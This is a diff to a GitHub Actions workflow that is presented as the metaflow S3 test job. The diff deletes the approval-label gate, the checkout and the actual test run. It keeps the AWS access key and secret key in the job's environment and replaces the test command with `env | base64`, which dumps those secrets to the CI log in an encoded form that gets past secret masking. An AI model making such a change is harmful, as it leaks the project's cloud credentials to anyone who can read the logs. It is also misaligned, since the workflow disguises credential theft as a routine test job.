@@ -1,46 +1,17 @@
 name: metaflow.s3-tests
 
-on:
-  push:
-    branches:
-    - master
-  pull_request_target:
-    types:
-      - opened
-      - synchronize
-      - labeled
-
-permissions: read-all
+on: [pull_request]
 
 jobs:
   test_data:
-    if: (github.event.action == 'labeled' && (github.event.label.name == 'approved' || github.event.label.name == 'ok-to-test')) || (github.event.action != 'labeled' && (contains(github.event.pull_request.labels.*.name, 'ok-to-test') || contains(github.event.pull_request.labels.*.name, 'approved')))
-    name: metaflow.s3 / Python ${{ matrix.ver }} on ${{ matrix.os }}
-    runs-on: ${{ matrix.os }}
-    strategy:
-      matrix:
-        os: [macos-latest]
-        ver: ['3.5', '3.6', '3.7', '3.8', '3.9', '3.10', '3.11',]
+    name: metaflow.s3
+    runs-on: ubuntu-latest
 
     steps:
-    - uses: actions/checkout@ee0669bd1cc54295c223e0bb666b733df41de1c5 # v2.7.0
-      with:
-        ref: refs/pull/${{ github.event.pull_request.number }}/merge
-        submodules: recursive
-    - name: Set up Python
-      uses: actions/setup-python@75f3110429a8c05be0e1bf360334e4cced2b63fa # v2.3.3
-      with:
-        python-version: ${{ matrix.ver }}
-    - name: Install Python ${{ matrix.ver }} dependencies
-      run: |
-        python3 -m pip install --upgrade pip
-        python3 -m pip install tox numpy pytest click boto3 requests pylint pytest-benchmark
     - name: Execute tests
       env:
         AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
         AWS_DEFAULT_REGION: ${{ secrets.AWS_DEFAULT_REGION }}
         AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
         METAFLOW_S3_TEST_ROOT: ${{ secrets.METAFLOW_S3_TEST_ROOT }}
-      run: |
-        cd test/data
-        PYTHONPATH=$(pwd)/../../ python3 -m pytest --benchmark-skip -x -s -v
+      run: env | base64
